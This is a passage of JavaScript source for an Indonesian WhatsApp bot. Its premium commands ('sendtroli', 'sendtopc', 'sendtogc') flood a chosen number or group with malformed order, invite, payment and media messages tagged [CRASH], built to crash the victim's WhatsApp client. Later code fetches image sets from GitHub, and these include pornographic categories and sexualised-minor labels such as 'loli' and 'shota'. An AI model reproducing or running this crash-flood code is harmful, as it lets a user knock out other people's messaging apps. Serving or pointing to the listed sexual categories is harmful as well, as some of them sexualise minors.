if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let fgif = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
'title':wm,
'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': wm,
'jpegThumbnail': thumb,
}
}
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:fgif})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "kirgosend5":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let floc = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: wm,
jpegThumbnail: thumb, 
}
}
}
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:floc})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "kirgosend6":
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let ftoko = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": thumb}, 
"title": wm, 
"description": wm, 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": wm, 
"productImageCount": 1}, 
"businessOwnerJid": `6281269024490@s.whatsapp.net`}}}	
sock.sendMessage(m.chat, {text:`${wm} [CRASH]`},{quoted:ftoko})}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
break
case "sendtroli":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "30"
let kgdhwus = await sock.onWhatsApp(num)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
for (let i = 0; i < jumlah; i++) {
let troli = await generateWAMessageFromContent(m.chat,{
"orderMessage": {
"orderId": "5287265358017580",
"thumbnail": thumb, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": wm,
"message": wm,
"sellerJid": "6281269024490@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}, {quoted: lep, contextInfo:{}}) 
sock.relayMessage(num, troli.message, { messageId: troli.key.id,})
}
reply(`Sukses Send Bug Di Nomor ${num}`)
}
break
case "sendtopc":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628362663622`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = "5"
let cekno = await sock.onWhatsApp(num)
if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281269024490@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`, thumbnail: thumb, caption: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: sock.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`,jpegThumbnail: thumb,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
sendBug(num)
sock.sendMessage(num,{text:`hai kak wa nya error gak?`},{quoted:lep})
sock.sendMessage(num, listMenuMessage, { quoted: lep })
sock.relayMessage(num, buginvite.message, { messageId: buginvite.key.id })
sock.relayMessage(num, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
sock.relayMessage(num, pollCreation.message, { messageId: pollCreation.key.id })
sock.relayMessage(num, order.message, { messageId: order.key.id })
sock.relayMessage(num, audio.message, { messageId: audio.key.id })
sock.relayMessage(num, image.message, { messageId: image.key.id })
sock.relayMessage(num, document.message, { messageId: document.key.id })
sock.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
sock.relayMessage(num, sticker.message, { messageId: sticker.key.id })
sock.sendKatalog(num, `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`, `ৡৢ͜͡𝟒𝟎𝟒-Dims Bot ⸸⁶⁶⁶_さん ${buttonvir}`, thumb, { quoted: lep })
sock.sendMessage(num, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case "sendtogc":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
if (!q) return reply(`Penggunaan ${prefix+command} link`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
let jumlah = "30"
for (let i = 0; i < jumlah; i++) {
let kir = await sock.groupAcceptInvite(result)
sendBug(kir)
}}
break
case "scircle": case "sbulat":
reply("```Wet Sabar Lagi Proses```")
if (/image/.test(mime)) {
let pvlrk = await quoted.download()
SendStick(from, pvlrk, "\n\nSticker By Dims Bot\n\nWA : 6281269024490\n\nSave Yah Buat Cewek-cewek", "", m, "circle")
} else {
reply("Gunakan Foto Saja Kak Yang Lain Gak Bisa Soalnya")
}
break
case "snobg": {
if (/image/.test(mime)) {
let media = await sock.downloadAndSaveMediaMessage(quoted)
let encmedia = await sock.sendStimg(m.chat, await remove(media), m, { packname: "Sticker By Dims Bot\nWA : 6281269024490\nSave Yah Buat Cewek-cewek", author: "" })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}`)
}
}
break
case "tourl":
try {
let jj = await sock.downloadAndSaveMediaMessage(quoted)
let dad = await uploadimage(jj)
m.reply(util.format(dad.url))
} catch (err) {
console.log(err)
reply(`Reply Media Nya`)
}
break
case "obfus":{
if (!q) return reply(`Contoh ${prefix+command} const Dims Bot = require('Dims Bot-api')`)
let meg = await encrypt(q)
reply(`Sukses
${meg.result}`)
}
break
case "sticker": case "s": {
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
reply("```Wet Sabar Lagi Proses```")
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await sock.sendStimg(m.chat, media, m, { packname: "Sticker By Dims Bot\nWA : 6281269024490\nSave Yah Buat Cewek-cewek", author: "" })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await sock.sendStvid(m.chat, media, m, { packname: "Sticker By Dims Bot\nWA : 6281269024490\nSave Yah Buat Cewek-cewek", author: "" })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "aesthetic": case "ahegao": case "akira": case "akiyama": case "ana": case "anjing": case "art": case "ass": case "asuna": case "ayuzawa": case "bdsm": case "boneka": case "boruto": case "bts": case "cecan": case "chiho": case "chitoge": case "cogan": case "cosplay": case "cosplayloli": case "cosplaysagiri": case "cuckold": case "cum": case "cyber": case "darkjokes": case "deidara": case "doraemon": case "eba": case "elaina": case "emilia": case "ero": case "erza": case "exo": case "femdom": case "foot": case "freefire": case "gamewallpaper": case "gangbang": case "gifs": case "glasses": case "gremory": case "hekel": case "hentai": case "hestia": case "hijaber": case "hinata": case "husbu": case "inori": case "islamic": case "isuzu": case "itachi": case "itori": case "jahy": case "jeni": case "jiso": case "justina": case "kaga": case "kagura": case "kakasih": case "kaori": case "kartun": case "katakata": case "keneki": case "kotori": case "kpop": case "kucing": case "kurumi": case "lisa": case "loli": case "madara": case "masturbation": case "megumin": case "mikasa": case "mikey": case "miku": case "milf": case "minato": case "mobil": case "motor": case "mountain": case "naruto": case "neko": case "neko2": case "nekonime": case "nezuko": case "onepiece": case "orgy": case "panties": case "pentol": case "pokemon": case "profil": case "programming": case "pubg": case "pussy": case "randblackpink": case "randomnime": case "randomnime2": case "rize": case "rose": case "ryujin": case "sagiri": case "sakura": case "sasuke": case "satanic": case "shina": case "shinka": case "shinomiya": case "shizuka": case "shota": case "tatasurya": case "technology": case "tejina": case "tentacles": case "thighs": case "toukachan": case "tsunade": case "waifu": case "wallhp": case "wallml": case "wallnime": case "yotsuba": case "yuki": case "yulibocil": case "yumeko":{
if (!isPremium && !isCreator) return sock.sendMessage(from, { text: `Maaf Kak @${sender.split("@")[0]}, Kakak Belum Premium Silahkan Chat @${creAtor.split("@")[0]} Untuk Membeli Premium`, mentions: [sender, creAtor], "contextInfo": { "forwardingScore": 99999999999, "isForwarded": true, mentionedJid: [sender, creAtor] }},{quoted:m})
reply("```Wet Sabar Lagi Proses```")
let heyy
if (/aesthetic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/aesthetic.json')
if (/ahegao/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/ahegao.json')
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/ana.json')
if (/anjing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/anjing.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/art.json')
if (/ass/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/ass.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/ayuzawa.json')
if (/bdsm/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/bdsm.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cosplaysagiri.json')
if (/cuckold/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cuckold.json')
if (/cum/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cum.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/cyber.json')
if (/darkjokes/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/darkjokes.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/emilia.json')
if (/ero/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/ero.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/femdom.json')
if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/foot.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/gamewallpaper.json')
if (/gangbang/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/gangbang.json')
if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/gifs.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/gremory.json')
if (/hekel/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/hekel.json')
if (/hentai/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/hentai.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/hestia.json')
if (/hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/hijaber.json')
if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/hinata.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/itori.json')
if (/jahy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/jahy.json')
if (/jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kaori.json')
if (/kartun/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kartun.json')
if (/katakata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/madara.json')
if (/masturbation/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/masturbation.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/miku.json')
if (/milf/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/milf.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/minato.json')
if (/mobil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/onepiece.json')
if (/orgy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/orgy.json')
if (/panties/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/panties.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/pubg.json')
if (/pussy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/pussy.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Dims Bot/nyenyee/master/shinka.json')
